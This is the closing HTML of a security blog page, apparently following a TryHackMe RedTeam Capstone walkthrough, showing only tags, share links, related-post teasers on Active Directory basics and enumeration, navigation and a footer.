href="/tags/writeups/" class="post-tag no-text-decoration" >writeups</a> <a href="/tags/networks/" class="post-tag no-text-decoration" >networks</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Breaking the Vault | A Detailed Walkthrough of The RedTeam Capstone Challenge - Muhammad Adel&url=https://itsfading.github.io/posts/TryHackMe-RedTeamCapstoneNetwork-Writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Breaking the Vault | A Detailed Walkthrough of The RedTeam Capstone Challenge - Muhammad Adel&u=https://itsfading.github.io/posts/TryHackMe-RedTeamCapstoneNetwork-Writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Breaking the Vault | A Detailed Walkthrough of The RedTeam Capstone Challenge - Muhammad Adel&url=https://itsfading.github.io/posts/TryHackMe-RedTeamCapstoneNetwork-Writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/CRTP-Commands-CheatSheet/">CRTP Commands CheatSheet</a><li><a href="/posts/Active-Directory-Authentication/">Active Directory Authentication</a><li><a href="/posts/Mobile-Hacking-Lab-IOS-Challenges-Writeups/">MobileHackingLab IOS Challenges Writeups</a><li><a href="/posts/Active-Directory-Basics/">Active Directory Basics</a><li><a href="/posts/Cybertalents-Shadower-Machine-Writeup/">Cybertalents Shadower Machine Writeup</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cybertalents/">cybertalents</a> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/redteaming/">redteaming</a> <a class="post-tag" href="/tags/android-security/">android security</a> <a class="post-tag" href="/tags/bug-hunting/">bug hunting</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/android-security/">Android Security</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Active-Directory-Basics/"><div class="card-body"> <span class="timeago small" > Jun 25, 2021 <i class="unloaded">2021-06-25T17:20:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory Basics</h3><div class="text-muted small"><p> Active directory overview what is Active directory? Active Directory is a collection of machines and servers connected inside of domains, that are a collective part of a bigger forest of domains, t...</p></div></div></a></div><div class="card"> <a href="/posts/Active-Directory-Enumeration/"><div class="card-body"> <span class="timeago small" > Jun 25, 2021 <i class="unloaded">2021-06-25T18:35:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory Enumeration</h3><div class="text-muted small"><p> Using PowerView Domain Information PS C:\Users&gt; Get-NetDomain PS C:\Users&gt; Get-NetDomain -Domain m.local PS C:\Users&gt; Get-NetDomainSID PS C:\Users&gt; Get-NetDomainController PS C:\Users...</p></div></div></a></div><div class="card"> <a href="/posts/Active-Directory-Attacks/"><div class="card-body"> <span class="timeago small" > Jun 25, 2021 <i class="unloaded">2021-06-25T18:45:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory Attacks</h3><div class="text-muted small"><p> LLMNR Poisoning It stands for Link-Local Multicast Name Resolution. it acts as a host discovery/identification method in windows systems. LLMNR and NBT-NS (NetBios Name System)are used as an alter...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/BlackHatMEA-Qualifications-2022-Writeup/" class="btn btn-outline-primary" prompt="Older"><p>BlackHatMEA Qualifications 2022 CTF Web Challenges Writeup</p></a> <a href="/posts/Insecureshop-Android-Vulnerable-Application-Writeup/" class="btn btn-outline-primary" prompt="Newer"><p>Walkthrough of The InsecureShop Android Vulnerable Application</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/ItsFadinG_">Muhammad Adel</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by Passion and Enthusiasm</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cybertalents/">cybertalents</a> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/redteaming/">redteaming</a> <a class="post-tag" href="/tags/android-security/">android security</a> <a class="post-tag" href="/tags/bug-hunting/">bug hunting</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/android-security/">Android Security</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://itsfading.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
